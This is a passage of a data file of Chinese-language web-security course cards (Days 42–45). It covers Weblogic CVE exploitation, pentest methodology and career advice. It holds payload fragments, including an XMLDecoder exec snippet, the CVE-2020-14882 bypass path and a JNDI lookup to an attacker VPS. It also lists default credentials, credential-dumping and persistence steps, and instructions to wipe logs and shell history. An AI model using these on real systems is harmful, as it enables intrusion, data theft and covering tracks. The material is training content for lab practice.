    ['🎓 难度进度条','#be123c',['基础检测DNS探测 ████████░ 80%','出网JNDI远程RCE ███████░░ 70%','JDK8u191+ TomcatEL绕过 █████░░░░ 50%','不出网信息泄露全收集 ████████░ 80%','WAF绕过8大变形 ██████░░░░ 60%','加固7件套落地验证 ████████░ 80%']],
    ['✅ Day42 通关自测CheckList','#166534',['DNSLog盲探 成功在dnslog.cn接收到请求','${java:version} 成功泄露JDK版本','出网场景 成功RCE执行whoami并回显','CVE-2021-45046 二次绕过 成功在2.15.0命中','JNDIExploit 内存马成功注入','加固后 所有Payload全部失效验证']],
  ],
  43: [
    ['🏰 Weblogic 企业级中间件全景','#7f1d1d',['Oracle Fusion Middleware旗舰JavaEE容器','支持EJB/JMS/Servlet/JSP/T3/IIOP协议','版本: 10.3.6/12.1.3/12.2.1.3/12.2.1.4/14.1.1','默认端口 7001/7002/5556/7003/8453','企业应用占有率: 金融/政府/运营商 极高']],
    ['🕳️ Weblogic 核心CVE漏洞时间线','#991b1b',['2017 CVE-2017-10271 XMLDecoder反序列化 WLS-WSAT','2018 CVE-2018-2628 T3反序列化(CommonsCollections)','2019 CVE-2019-2725 XMLDecoder _async RCE 无权限','2020 CVE-2020-2555 T3反序列化(FilteredObjectInputStream)','2020 CVE-2020-14882 Console 未授权RCE URL编码双写绕过','2021 CVE-2021-2109 JNDI注入+T3','2021 CVE-2021-35637 IIOP协议反序列化']],
    ['🔌 Weblogic 协议端口矩阵','#1e3a8a',['7001 HTTP 控制台/业务 (TCP明文)','7002 HTTPS/T3S SSL加密 (常用)','7003 Managed Server 受管服务器','5556 NodeManager 节点管理器','8453 远程调试 JDWP (危险!)','9002 Coherence 分布式缓存','T3: WebLogic专有 RMI over HTTP 协议','IIOP: CORBA标准远程调用 兼容EJB','JNDI: 1099默认 命名目录服务']],
    ['💥 CVE-2019-2725 XMLDecoder攻击链','#b91c1c',['影响版本: 10.3.6 / 12.1.3 (无需权限无认证)','攻击路径: POST /_async/AsyncResponseService','SOAP Body: soapenv:Envelope + work:WorkContext','<java class="java.beans.XMLDecoder"> 标签','<object class="java.lang.Runtime"><void method="exec">','<string>calc.exe</string></void></object> → 直接回显RCE','修复补丁: PSU 升级 / WLS9-async补丁包 / 删除_async目录']],
    ['🚪 CVE-2020-14882 未授权访问原理','#92400e',['影响版本: 12.2.1.3 / 12.2.1.4 / 14.1.1.0','核心问题: Console WebApp URL权限校验不完整','攻击路径: /console/css/%252e%252e%252fconsole.portal','原理: 双重URL编码 %252e → URL decode两次 ../','绕过: 静态资源/css/* 前缀 跳过权限过滤器','然后加载 _nfpb=true&_pageLabel=HomePage1 → 后台命令执行','配合 14883: 执行任意命令 无需登录']],
    ['🧩 CVE-2020-2555 T3协议反序列化','#7c2d12',['影响: 12.2.1.3/12.2.1.4/14.1.1 无需登录','核心类: FilteredObjectInputStream 黑名单绕过','利用链: Weblogic.common.internal.WLObjectInputStream','CC链变种: CommonsCollections5/6/7','Payload: ysoserial.generateObject("CC6","calc")','触发: 7001端口 直接发T3协议 握手 + Invoke','修复: T3协议加密/禁用 / 升级 PSU / RASP拦截']],
    ['🎯 CVE-2021-2109 JNDI注入+T3','#4c1d95',['影响: 12.2.1.3/12.2.1.4/14.1.1 (2021CPU补丁)','原理: JTA/JTS 接口 JNDI lookup 用户可控URL','协议: T3 + JNDI URL 注入','攻击: ${jndi:ldap://VPS:1389/xxx} 在对象里','利用: JNDILookup / Coherence 远程类加载','修复: 升级 2021-4月 PSU / 禁用T3 / JEP290']],
    ['🧰 实战工具箱 全家桶','#0f172a',['WeblogicScan 批量漏洞扫描器(16项CVE检测)','beacon-Scan: CVE-2014-4210 SSRF扫描器','CVE-2020-14882 EXP.py: 一键未授权RCE','CVE-2019-2725 EXP: XMLDecoder POC','CVE-2020-2555: ysoserial-modified CC链专用版','JNDIExploit 1.4: T3+JNDI组合利用','nuclei: http/cves/2020/CVE-2020-14882.yaml','wls-shell: Weblogic专用Webshell管理']],
    ['🔐 加固方案 9件套','#166534',['① 每年4/7/10/1月 安装Oracle PSU 关键补丁','② 禁用T3/IIOP协议: 控制台→服务器→协议→启用T3=否','③ 7001/7002端口仅内网开放 或ACL白名单','④ 删除不必要服务: _async/uddiexplorer/ws-utc/consolehelp','⑤ 控制台admin密码复杂度 12位以上 定期更换','⑥ 禁用NodeManager 5556远程管理 默认账号密码','⑦ JavaAgent/RASP: 拦截XMLDecoder/T3反序列化/JNDI','⑧ JVM参数: 开启JEP290 序列化白名单','⑨ WAF: 拦截Weblogic 特征URL 14882/2725 POC特征']],
    ['📖 控制台默认账号密码Top10','#7c3aed',['weblogic / weblogic (10.x 默认)','system / password','admin / security123','weblogic / Oracle@123','weblogic / welcome1','weblogic / weblogic1','weblogic / base_domain','system / manager','admin / admin','deployer / deployer123']],
    ['🔍 指纹识别 9法','#0e7490',['① 7001端口 404页面样式 → Weblogic绿底白字风格','② /console 登录页: Oracle WebLogic Server 版本号','③ /console/images/console_logo.gif → 存在 指纹','④ /wls-wsat/CoordinatorPortType11 → WLS-WSAT服务 2725指纹','⑤ /_async/AsyncResponseService → 2725服务存在','⑥ Set-Cookie: ADMINCONSOLESESSION','⑦ Server响应头: WebLogic Server 10.x/12.x','⑧ /bea_wls_deployment_internal/DeploymentService → 部署服务','⑨ favicon.ico hash: we72U2f4xZ3aYw == Weblogic']],
    ['🗺️ 综合利用流程图','#7c2d12',['Step1: Nmap扫7001/7002/5556 + Nuclei全量Weblogic模板','Step2: 高优先级 → 14882未授权(版本12.2+/14c) 命中即RCE','Step3: 其次 → 2725 (10.3.6/12.1.3 无认证直接RCE)','Step4: 版本12.2+ → 2555/2109 T3+JNDI 需7001开放T3','Step5: 旧版10.3.6 → 10271 / 2628 XML反序列化','Step6: /console 弱口令 → 部署WAR包 拿持久化Shell','Step7: NodeManager 5556 弱口令 → 远程部署全机器控制']],
    ['📋 常见问题排查10条','#b45309',['[WARN] 401/403 → 14882 Payload编码 检查双重URL编码','[ERR] T3 ProtocolException → 目标禁用T3 / 协议握手失败','[ERR] Connection refused → 7001端口关闭 / 防火墙','[ERR] ClassNotFound CC6 → 目标Commons-Collections版本不匹配','[WARN] 7001无控制台 → 可能是Managed Server 请扫7002+端口','[ERR] XMLDecoder 500 → 补丁已修复 或SOAP格式错','[OK] 命令无回显 → 换dnslog 先出网探测 在反弹shell','[ERR] 500 Unable to compile class for JSP → 权限不足目录','[INFO] 上线后不稳定 → 换内存马 / Filter级别内存马','[WARN] 302跳登录 → 检查 Cookie JSESSIONID 注入时带对']],
    ['🧠 面试：T3协议为什么危险？','#0e7490',['T3: Weblogic定制协议 RMI-over-HTTP','底层: ObjectInputStream 直接反序列化客户端传入对象','Java原生反序列化 = 攻击者可控任意字节流','配合 CC/CB1 链 → 目标服务器直接RCE','加上 无需认证 → 全版本批量危害极高','防御: T3加密(T3S) / 禁用T3 / RASP拦截 / JEP290']],
    ['📊 CVSS得分 vs 实战优先级','#be123c',['CVE-2020-14882 → CVSS 9.8 / 优先级P0 (无需登录 通用12c)','CVE-2019-2725 → CVSS 10.0 / 优先级P0 (10.3.6/12.1.3 通用无权限)','CVE-2020-2555 → CVSS 9.8 / 优先级P1 (T3开放时)','CVE-2021-2109 → CVSS 9.8 / 优先级P1 (T3+JNDI 需JDK版本)','CVE-2018-2628 → CVSS 10.0 / 优先级P2 (10.3.6 + T3)','NodeManager 5556 弱口令 → CVSS 9.1 / 优先级P0 (部署级别)']],
    ['🚩 内存马在Weblogic的5种形态','#7c3aed',['① Servlet 内存马 动态注册 addServlet + mapping','② Filter 内存马 filterConfig 动态添加 / doFilter 拦截','③ Listener 内存马 ServletRequestListener 监听请求','④ Weblogic AuthenticatorProvider 登录后门账号','⑤ T3协议拦截器 → 特定T3请求直接执行命令 隐蔽级最高']],
    ['🧱 CVE-2014-4210 SSRF漏洞','#0369a1',['影响版本: 10.0.2 / 10.3.6 (UDDI Explorer)','路径: /uddiexplorer/SearchPublicRegistries.jsp?','参数: operator=http://内网IP:port/xx → 内网探测','回显: could not connect / 404 / 返回内容 差异','利用: 扫内网Redis/MySQL/ES/FastCGI / 云元数据','修复: 删除 uddiexplorer.war / 打 PSU / WAF拦截URL']],
    ['🛰️ 域架构 vs 单机架构','#1e40af',['单机Domain: AdminServer 同时承载业务(测试/小站)','域架构: AdminServer (7001 管理) + N*ManagedServer (7003+ 业务)','生产架构: 通常 AdminServer 7001 仅内网不对外','内网SSRF: 打穿业务机 → SSRF 扫7001 Admin → 14882拿下全域','危害: 一台受管 → 整个域所有服务器 被部署内存马']],
    ['🎓 难度进度条','#991b1b',['14882 未授权RCE ████████░ 80%','2725 XMLDecoder ████████░ 80%','2555 T3反序列化 █████░░░░ 50%','控制台弱口令部署WAR ███████░░ 70%','加固9件套落地验证 ██████░░░░ 60%','域架构内网横向 ████░░░░░ 40%']],
    ['✅ Day43 通关自测CheckList','#166534',['Weblogic 9种指纹识别 全部掌握','Vulhub 14882靶机 未授权RCE 成功回显whoami','2725 XMLDecoder POC 成功执行命令','控制台弱口令爆破 + 部署WAR 成功拿Shell','T3开放时 2555/2109 成功RCE','加固后 全部CVE 验证失效','SSRF 4210 内网探测 扫到内网Redis']],
  ],
  44: [
    ['🎯 综合靶场实战7段方法论','#0e7490',['PTES 标准渗透测试执行标准 7阶段','① Pre-Engagement 预约定范围/授权书/目标','② Intelligence Gathering 信息收集(被动+主动)','③ Threat Modeling 威胁建模(资产/弱点/入口)','④ Vulnerability Analysis 漏洞分析与验证','⑤ Exploitation 漏洞利用(组合拳/Bypass/提权)','⑥ Post-Exploitation 后渗透(横向/持久化/数据)','⑦ Reporting 报告与修复建议 汇报交付']],
    ['🧱 靶场组合训练架构图','#1e3a8a',['外围边界层: Nginx WAF CDN 80/443','业务层: Web应用 SpringBoot/PHP/Node 8080/9000','中间件层: Tomcat/Nginx/Redis/MySQL 7001/3306/6379','内网层: AD域/办公机/运维跳板机 192.168段','数据层: Elasticsearch/MongoDB/Hadoop 9200','管理层: Jenkins/GitLab/Nexus 8080/8081/9090','堡垒机/JumpServer: 443 运维入口 优先级P0']],
    ['🗺️ Vulhub 靶机组合推荐 12台','#0369a1',['① Web入门: dvwa + pikachu + upload-labs (Day1~30)','② 注入专项: sqli-labs 75关 (Day20~25)','③ Java中级: struts2/s2-045 + thinkphp/5.x-rce + fastjson 1.2.24','④ Shiro三件套: shiro 550 + shiro 721 PaddingOracle + Cas反序列化','⑤ 核弹漏洞: log4j2 CVE-2021-44228 + CVE-2021-44832 JDBC','⑥ Weblogic全家桶: 14882 + 2725 + 2555 + 2109','⑦ 框架漏洞: ThinkCMF + ThinkPHP6 + Laravel + SpringBoot Actuator','⑧ SSRF/XXE: PHP XXE + WebLogic SSRF + gopherus Redis攻击','⑨ 中间件: Apache解析 + Nginx目录穿越 + Tomcat PUT + IIS6解析','⑩ 反序列化: PHP phar:// + Java CommonsCollections + .NET ViewState','⑪ 内网横向: vulhub/ms17-010 + vulhub/redis-unauth + docker-api unauth','⑫ 综合大靶场: vulhub/vulfocus 集成 一键组合 30+漏洞 连贯演练']],
    ['🕵️ 阶段①: 信息收集 12件套','#0f766e',['被动OSINT: theHarvester + subfinder + amass 子域名/邮箱/资产','搜索引擎: site:target.com + Github Sensitive + FOFA/Shodan','Whois/DNS: 注册人/邮箱/NS记录/A记录/CNAME/AXFR尝试','端口扫描: Nmap -A -sV + Masscan 全端口 0-65535','服务识别: Nmap -sV + banner grab 指纹版本','目录扫描: dirsearch/dirbuster/gobuster 字典跑 common+平台专用','JS敏感信息: LinkFinder/jsluice/JSFinder 找接口/密钥/内网地址','WAF识别: wafw00f + XSStrike + sqlmap --wizard','CMS指纹: whatweb + cmseek + eHole 识别CMS版本','Github信息泄露: gitdorker + GitHub搜索 tokens/passwords/backup','云资产: S3 Bucket 列表 + COS 签名泄露 + 阿里云 ECS Metadata','旁站/C段: Nmap C段扫描 + Shodan/FOFA ip:网段 + WebLogic集群']],
    ['🧩 阶段②~④: 漏洞分析与验证流程','#92400e',['漏洞情报匹配: 服务版本 → 查CVE/NVD/CNNVD → Nuclei批量打','低危到高危递进: 先试信息泄露/目录穿越 → SQLi/XSS → RCE级','指纹精准匹配: 别用IIS的EXP去打Apache 别乱扫 浪费时间还容易告警','漏洞POC三件套: 手工验证1个 → Burp抓包 → 写批量脚本','安全意识: 一个漏洞没成? 别放弃 试试变形/WAF绕过/编码双写','组合拳思路: Nginx目录穿越读源码 → 源码审计发现SQL → sqlmap跑数据','出网探测优先: 所有疑似漏洞 先 DNSLog/${jndi:dns} 盲探 不触发WAF']],
    ['💣 阶段⑤: Exploitation 漏洞利用 组合拳','#be123c',['组合拳①: SSRF + Gopherus → Redis未授权 → SSH公钥写入','组合拳②: Fastjson → JNDI → 注入内存马 → 哥斯拉上线','组合拳③: Log4Shell不出网 → 泄露Spring密码 → JDBC连接库','组合拳④: Shiro 550 Key爆破 → 上线CS → 抓取域管Hash','组合拳⑤: SQLi 报错注入 → load_file读config → 数据库账号密码 → 提权UDF','组合拳⑥: ThinkPHP 5.0.24 RCE → 命令执行 → 写Shell → Docker逃逸','组合拳⑦: Weblogic 14882 未授权 → 内存马 → NTLM Relay 拿域控','组合拳⑧: Jenkins未授权脚本控制台 → Groovy RCE → 加Jenkins管理员账号','组合拳⑨: 文件上传 .phar → phar://反序列化 → 任意文件删除+RCE','组合拳⑩: Struts2 S2-045 → OGNL命令执行 → 反弹meterpreter']],
    ['🗡️ 阶段⑥: 后渗透 10个必做动作','#7c2d12',['① 权限维持: 加crontab / 启动项 / 用户后门 / SSH公钥 / rootkit / 内存马','② 凭据收集: /etc/shadow + Mimikatz sekurlsa::logonpasswords + LaZagne 全浏览器','③ 信息收集: ifconfig/ipconfig → 内网网段 / 域信息 / DNS / 共享目录','④ 横向移动: CrackMapExec/Impacket smbexec/wmiexec/psexec 批量C段','⑤ 数据库窃取: mysqldump 导出 / impacket mssqlclient / navicat 密码找','⑥ 跳板机: SSH -D 1080 Socks5隧道 / FRP 内网穿透 / EarthWorm 多级跳板','⑦ 漏洞扫描内网: 内网C段 Masscan + Nmap + Vuln 批量 ms17-010/445端口','⑧ 提权: Linux提权脚本 LinEnum/PEASS / Windows提权 PowerUp','⑨ 文件窃取: 敏感目录 /backup /config /database / 财务数据 / 源代码','⑩ 痕迹清理: history -c / 删除/var/log/* / 清理IIS/Apache日志 / 事件日志wevtutil']],
    ['🛰️ 隧道与内网穿透 5方案','#4c1d95',['方案1: SSH隧道 最稳 → ssh -CfNg -L 3306:127.0.0.1:3306 user@jump','方案2: FRP 高性能跨网 → frps(VPS) + frpc(内网靶机) 穿透任意端口','方案3: EarthWorm(EW) 多级跳板 → sssocksd + rcsocks 3~5级内网跳转','方案4: Chisel HTTP/Socks → 基于HTTP隧道 加密流量 过防火墙','方案5: Neo-reGeorg → 基于HTTP正向代理 Webshell型 过严格WAF出口']],
    ['🧰 综合靶场工具库 Top30','#0f172a',['侦察: Nmap / Masscan / Amass / Subfinder / Dirsearch / Gobuster / WhatWeb','OSINT: theHarvester / Maltego / FOFA / Shodan / ZoomEye / GitDorker','漏洞利用: BurpSuitePro / Sqlmap / XSStrike / MSF / Nuclei / Yakit','后渗透: Cobalt Strike / Metasploit / Mimikatz / CrackMapExec / Impacket / LaZagne','内网: FRP / EarthWorm / Chisel / Neo-reGeorg / Proxychains-ng / Hydra','审计: CodeQL / Semgrep / SonarQube / VSCode + 正则搜索漏洞点','报告: Dradis / Faraday / CherryTree / POC-T 批量 / AutoSploit']],
    ['📝 阶段⑦: 渗透报告7大章节','#0e7490',['① 执行摘要Executive Summary: 给高管看的300字结论 + 风险矩阵彩图','② 范围与授权书: SOW 声明的测试范围/时间/人员/免责声明','③ 信息收集结果: 资产清单 + 网络拓扑 + 子域名 + 端口服务表','④ 漏洞详情 按CVSS由高到低: 每个漏洞 = 标题+CVSS+复现步骤+截图+修复建议','⑤ 攻击时间线 攻击者视角: 入口点 → 权限提升 → 横向过程 → 最终成果','⑥ 数据泄露/影响评估: 泄露的用户数据/商业机密 量化损失建议','⑦ 修复建议 + 整改优先级: 短期(24小时)/中期(7天)/长期(30天) 三级计划 + 复测时间']],
    ['⚠️ 实战避坑指南 15条','#92400e',['① 永远先读授权书! 授权范围外的IP 千万别扫 扫到就是犯法','② 扫描限速: nmap -T3/T2 别用-T5 不然秒被封 对方IDS/IPS 10秒拉黑','③ WAF绕过: 一个payload不行 换编码(URL×2/Unicode/Hex/Base64)、空格变形、Host头绕','④ 反弹shell失败: 检查目标出网(telnet VPS 443) / 换端口80/443/53 / 换bash到nc到python','⑤ 提权失败: 先LinEnum/WinPEAS 扫一遍系统 找SUID/计划任务/可写服务/内核漏洞','⑥ 横向被拦: 不用SMB 换WMI/WinRM/PSRemoting 或者打域控MS14-068 / Zerologon','⑦ 内网慢: 开代理后 先扫445/3389/22/6379/8080 高频端口 不要扫全段65535','⑧ 内存马被查杀: 换哥斯拉/Behinder/菜刀加密马 / 改特征 / 注入到正常进程','⑨ DNSLog没反应: 换DNSLog平台 dnslog.cn / ceye.io / burp collaborator / 自己搭VPS Bind','⑩ SQLMap跑不出: 加--level=5 --risk=3 / --random-agent / --tamper=space2comment 绕WAF','⑪ 文件上传绕不过: 图片马+%00+双后缀+竞争上传 / .htaccess / .user.ini / 解析漏洞组合','⑫ SSRF打不到云元数据: 换169.254.169.254所有别名 / DNS Rebind / 短链接跳转','⑬ 打了补丁的漏洞: 换变种POC / 搜索最新CVE年份2024/2025 可能有0day',"⑭ 反弹shell乱码: 加python -c \"import pty; pty.spawn('/bin/bash')\" / 换zsh/bash/sh",'⑮ 打完留痕: 日志必须清 / history -c 三令 / SSH记录擦除 / 最后截图报告 全程录屏']],
    ['🏆 真实攻防实战 3个标准组合案例','#7c2d12',['案例A-金融Web系统: 入口(Struts2 RCE) → 凭据收集(数据库账号) → 横向(C段Tomcat弱口令批量) → 核心数据库导出(500万用户) → 持久化(内存马+管理员账号) 总耗时: 4小时','案例B-政府OA系统: 入口(Log4j2 DNS探测成功+JNDI上线) → 提权(Windows Server 2012 KiTrap0D → System) → 抓Hash(域控管理员) → PassTheHash进域控 → 全部门共享文件 总耗时: 6小时','案例C-企业SaaS平台: 入口(GitLab信息泄露源码+密钥) → 审计源码发现Druid未授权+SQL → 数据库导出 + SSRF到云元数据(AK/SK泄露) → 拿下对象存储全部用户上传文件 总耗时: 3小时']],
    ['🧠 面试: 一场完整的渗透测试流程？','#0e7490',['① 明确目标与授权书(最关键)','② 被动OSINT + 主动扫描 获取全量资产指纹','③ 漏洞情报匹配 + Nuclei批量 精准挑高危利用点','④ 入口漏洞(WebRCE/弱口令/信息泄露组合) 拿下Webshell','⑤ 本地提权到root/system 抓取凭据','⑥ 隧道穿透 + 内网横向 打到核心资产(域控/DB/代码仓库)','⑦ 数据窃取/影响评估 + 持久化(授权范围内)','⑧ 痕迹清理 + 完整报告交付 + 复测验证']],
    ['🎯 CTF Web 综合靶场的5条得分技巧','#be123c',['① 先扫全站: dirsearch 扫出后台 / robots.txt / .git / .swp / 备份包','② 先出网: 任何疑似注入 先试DNSLog盲打 出网=成功一半','③ 源码泄露: .git/index + Githack / 备份.sql / www.zip 下来审计','④ 组合利用: 文件上传+解析漏洞 / SSRF+Redis / XXE+Blind OOB','⑤ 猜考点: 比赛一般就考最新CVE + 反序列化 + SSTI + 条件竞争 + 内网代理']],
    ['🛡️ 红队 vs 蓝队 职责对比','#0369a1',['红队: 模拟真实攻击者 → 找漏洞/打点/横向/持久化/拿域控 (进攻)','蓝队: 防守+监测+响应 → 部署EDR/SIEM/HIDS/WAF/日志分析/应急响应/溯源','紫队: 红蓝对抗协作 → 红队打+蓝队同时看告警/调规则 共同提升防护水平','黄队: 工程化安全 → DevSecOps/S-SDLC/代码审计/安全开发 全流程把关注入安全','橙队: 威胁情报 → 0day挖掘/APT跟踪/漏洞预警/黑产监测 给红蓝提供武器弹药']],
    ['🗂️ PTES 7阶段详细拆解 Checklist','#0f172a',['① 预约定: SOW签署 + NDA + IP清单确认 + 应急联系人拿到 ✓','② 信息收集: 被动OSINT(子域/邮箱/Git) + 主动扫描(端口/服务/目录) ≥10项资产 ✓','③ 威胁建模: 资产分级 + 优先级排序(P0入口/P1核心/P2外围) + 攻击路径规划 ≥3条 ✓','④ 漏洞分析: POC验证 + 风险评级(CVSS) + 绕过方案 每个高危漏洞都有手工复现截图 ✓','⑤ 漏洞利用: EXP脚本稳定 + 反弹shell上线 + 权限维持 + 最少痕迹 每个入口≥1种利用 ✓','⑥ 后渗透: 提权成功 + 凭据收集完整 + ≥2个网段横向 + 核心资产访问到 + 报告截图齐全 ✓','⑦ 报告交付: 7大章节齐全 + 修复建议可操作 + 复测时间约定 + 客户培训 + 正式签署验收 ✓']],
    ['🎓 难度进度条','#166534',['信息收集 12件套 ████████░ 80%','10种漏洞组合拳 ██████░░░░ 60%','后渗透 10动作全套 █████░░░░ 50%','隧道内网穿透 ███████░░ 70%','完整报告7大章 ██████░░░░ 60%','完整7阶段实战熟练度 █████░░░░ 50%']],
    ['✅ Day44 通关自测CheckList','#166534',['PTES 7阶段标准流程 能讲清楚每一阶段做什么','Vulhub 12台靶机组合 至少独立打通过5台','10种组合拳 至少成功组合过3种 完整流程实战过','内网隧道 SSH/FRP/EW 三种任选 都能打通','写过1份完整的7大章节渗透报告 含截图复现','红蓝队职责 理解 能说清紫队/黄队是什么','避坑15条 踩过至少5条 有实战经验','一次完整打靶 从信息收集到横向拿核心 用时≤24小时']],
  ],
  45: [
    ['🎓 毕业总结：45天Web安全学习全景图','#166534',['第一阶段(Day1-11) Web入门: HTTP基础 + DVWA入门8模块 打基础','第二阶段(Day12-19) DVWA进阶: 7大高难度模块(XXE/Blind/CSP/JS/会话等)','第三阶段(Day20-25) SQL注入专项: SQLi-Labs 75关全覆盖 注入之王','第四阶段(Day26-30) 文件上传/XSS专项: Upload-Labs 21关 + Pikachu XSS全类型','第五阶段(Day31-36) 中级漏洞: XXE/SSRF/PHP反序列化/框架漏洞/Vulhub中级','第六阶段(Day37-39) Java三大件入门: Shiro/Fastjson/Log4j2 + 中间件基础','第七阶段(Day40-45) Java高阶+综合: Fastjson/Shiro/Log4j2/Weclogic深度 + 综合方法论 + 毕业总结']],
    ['🗺️ Web安全知识体系全景图(脑图式)','#0e7490',['【协议层】HTTP/HTTPS/TCP/IP / DNS / ARP / TLS握手 / CORS / SOP同源策略','【Web基础】HTML/JS/CSS / Cookie/Session/JWT / Ajax / WebSocket / REST / SOAP','【OWASP Top10 2021】A01失效访问控制/A02加密失效/A03注入/A04不安全设计/A05配置错误/A06缺陷组件/A07认证失败/A08软件完整性/A09日志监控失效/A10服务端请求伪造SSRF','【注入类】SQLi(报错/盲注/堆叠/二次/宽字节) / NoSQL注入 / XXE / SSTI模板注入 / Xpath注入','【客户端漏洞】XSS(反射/存储/DOM/Blind) / CSRF / CSP绕过 / JS前端逻辑漏洞 / Click劫持','【服务端漏洞】文件上传(解析/竞争/.htaccess) / 包含(LFI/RFI/php://) / 文件删除/下载/遍历 / SSRF / RCE(代码执行/命令执行/反序列化)','【认证与会话】弱口令/暴力破解/验证码绕过/JWT伪造/会话固定/Session劫持/OAuth越权','【框架类漏洞】ThinkPHP/Struts2/SpringBoot/Laravel/Shiro/Fastjson/Log4j2/WordPress/Dedecms','【中间件】Nginx/Apache解析/Tomcat PUT/IIS/WebLogic/JBoss/Redis未授权/MySQL UDF','【内网与域渗透】端口转发/隧道(FRP/SSH)/SMB横向/NTLM Relay/域控(MS14-068/Zerologon)/MS17-010','【攻防】WAF绕过/IPS/IDS/EDR/SIEM监测/应急响应/溯源/红队评估/CTF夺旗']],
    ['🏆 45天你已经掌握的核心能力 10项','#1e40af',['① Web攻防体系全面认知: 从OWASP Top10到内网域控 全链路无死角 不再碎片化学习 ✓','② 漏洞原理+实战 双重掌握: 每个漏洞都能讲清原理+手工复现+工具利用+修复方案 ✓','③ SQL注入之王: 手工+sqlmap 75关全覆盖 10种注入类型全部掌握 面试无压力 ✓','④ Java三大件核弹级漏洞: Fastjson/Shiro/Log4j2 版本差异/JDK兼容/Bypass/加固 全掌握 ✓','⑤ 中间件/框架漏洞: Weblogic/Tomcat/Nginx/IIS/Struts2/ThinkPHP 20+ CVE实战经验 ✓','⑥ 综合攻防实战能力: 从信息收集→漏洞→提权→横向→报告 完整PTES流程 独立完成 ✓','⑦ 内网渗透基础: 隧道/代理/凭据收集/横向移动/域内 打穿到核心服务器 ✓','⑧ 蓝队防守视角: 懂攻击更懂防御 WAF/RASP/加固/日志监测 修复建议可落地 ✓','⑨ 工具链熟练度: BurpSuite/Sqlmap/MSF/Nuclei/FRP/CS/Cobalt Strike 30+工具 高频使用 ✓','⑩ CTF/护网能力: 能独立参加CTF Web题 能在护网红队/蓝队承担至少一个专项任务 ✓']],
    ['🎯 三大就业方向 详细路径','#0369a1',['【红队/渗透测试工程师】: 先考OSCP/CEH → 2年Web经验 → 内/域渗透 → 高级红队 → 红队负责人 年薪20W→80W 面试考点: SQLi原理/Fastjson绕过/Shiro链/提权/横向/域渗透','【蓝队/SOC安全运营】: 先考CISSP/CISP → 1年EDR/SIEM/WAF经验 → 应急响应 → 蓝队负责人 → CISO 年薪20W→100W 考点: Windows事件/日志分析/IPS误报/溯源取证/APT样本','【漏洞挖掘/安全研究员】: 先拿CNVD/CNNVD证书 挖CVE → 复现+0day挖掘 → 高级研究员 → 首席科学家 年薪30W→150W 考点: CVE复现报告/Java反序列化/PWN基础/二进制/Fuzz/AFL','💡 新手推荐: 红队入门最快(岗位多) → 中级转蓝队(稳定) → 高阶做研究(天花板高) 三条路径可互通']],
    ['🏁 下一步学习路线：从入门→CTF→实战三级跃迁','#7c3aed',['【入门巩固(第1-2月)】靶场二刷: DVWA/Pikachu/Sqli-labs二刷 + Upload-labs二刷 + 写每关详细WriteUp 目标: 独立通关 不看任何教程','【CTF入段(第3-6月)】Web刷题: BUUCTF Web300题 + NSSCTF Web500题 + 参加各大高校校内赛 目标: CTF比赛 Web方向前10% 至少5个比赛证书','【Pwn/Crypto入门(第7-12月)】 Pwn: 栈溢出/堆溢出/格式化字符串 入门题100道 Crypto: RSA/AES/古典密码 入门题100道 → 目标: CTF综合能力 全国排名前1000 进决赛圈','【红队实战(第13-18月)】 Vulhub 200+漏洞全部通打一遍 + 护网实习/公司授权测试 + 拿CNVD/CNNVD通用证书至少30个 → 目标: OSCP证书 + 能独立做企业渗透测试项目','【高级安全研究(第19-36月)】 APT样本分析 / 0day挖掘 / 红队武器化开发 / 内存马/免杀/RASP对抗 → 目标: 2个以上CVE 全球排名 + 大厂高级安全岗位 offer']],
    ['📜 十大必考安全证书 含金量排序','#be123c',['① OSCP (Offensive Security) 红队天花板 / 纯手工24小时打靶机 全球公认 / 报名$999 过关率约30% 年薪加成+30W ✓','② CISP / CISP-PTE 国内渗透 / 必持 国企/网安招标必备 / 培训+考试 ¥9800 过关率约80% ✓','③ CISSP 国际信息安全专家 / 蓝队CISO路线 / 年薪加成+40W / 5年工作经验门槛 ✓','④ CEH (道德黑客) EC-COUNCIL / 红队入门级 / 国际认可 ✓','⑤ Security+ CompTIA / 美国军方安全岗必考 / 入门级性价比高 ✓','⑥ OSWE 白盒代码审计 / 源码审计+Exploit开发 / 难度高 ✓','⑦ CKS / CKA Kubernetes安全 / 云原生安全方向 高薪 ✓','⑧ AWS Security Specialty / 云安全方向 未来趋势 ✓','⑨ eJPT (eLearnSecurity Junior) / 入门友好 新人第一证 ✓','⑩ CRTP / CRTO / 红队认证 / 域渗透/CS/MSF实战 红队进阶 ✓']],
    ['🧠 面试高频题 Top30 必背清单','#92400e',['Web1: SQL注入10种类型/防御方案 预编译为什么能防？','Web2: XSS三类型 防御 CSP绕过 10种 DOM XSS常见sink','Web3: CSRF原理 与XSS区别 Token为什么能防 SameSite Cookie','Web4: SSRF 6协议 云元数据 Redis攻击 gopher构造方法 防御方案','Web5: XXE OOB Blind php://filter 读取源码 防御 禁用DTD/外部实体','Web6: 文件上传 21关 解析漏洞 .htaccess .user.ini 竞争上传 防御','Web7: SSRF vs CSRF vs RCE vs LFI 四个漏洞核心区别？','Java1: Fastjson 1.2.24/1.2.47/1.2.68 版本差异 JNDI链 SafeMode','Java2: Shiro-550/721原理 AES硬编码 Padding Oracle 加固5件套','Java3: Log4j2 44228/45046/45105/44832 修复版本链 JDK版本兼容','Java4: CommonsCollections/Beanutils1/TemplatesImpl 3条链原理','Java5: Weblogic 14882/2725/2555/2109 四条利用链区别 加固9件套','中间件: Nginx/Apache解析原理 IIS6 asp; IIS7 %00 Tomcat PUT 利用','框架: ThinkPHP 5.x RCE 原理 Struts2 S2-045 OGNL注入 SpringBoot Actuator泄露','内网: MS17-010/MS14-068/Zerologon/PTK/PTH 原理 横向方法','运维: Jenkins未授权 Git泄露 内网Redis Docker unauth API 利用','蓝队: WAF常见绕过 RASP原理 EDR检测 内存马检测方法 SIEM规则','CTF: SSTI Twig/Jinja2/FreeMarker 利用/绕过 条件竞争 PHP反序列化 phar:// POP链','代码审计: RCE/SQLi/XXE/XSS/SSRF 危险函数 Top50 正则/数据流分析方法']],
